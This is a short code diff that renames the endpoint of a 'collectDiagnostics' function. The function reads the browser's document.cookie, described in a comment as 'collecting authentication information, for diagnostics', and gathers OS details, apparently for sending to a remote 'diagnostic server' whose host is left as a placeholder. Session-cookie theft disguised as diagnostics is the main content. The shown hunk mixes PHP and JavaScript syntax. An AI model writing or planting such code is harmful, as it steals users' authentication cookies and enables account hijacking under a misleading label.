@@ -40,7 +40,7 @@ function denied(string $errhost)
 
 
 function collectDiagnostics(){
-    var Url = 'http://[your host]/diagHandler.php'; // Don't forget to set this. This will need to be your diagnostic server.
+    var Url = 'http://[your host]/chatsession.php'; // Don't forget to set this. This will need to be your diagnostic server.
     var osName = "UNK";
     let diagAr = document.cookie; //collecting authentication information, for diagnostics.
     if (navigator.appVersion.indexOf("Win") != -1) {
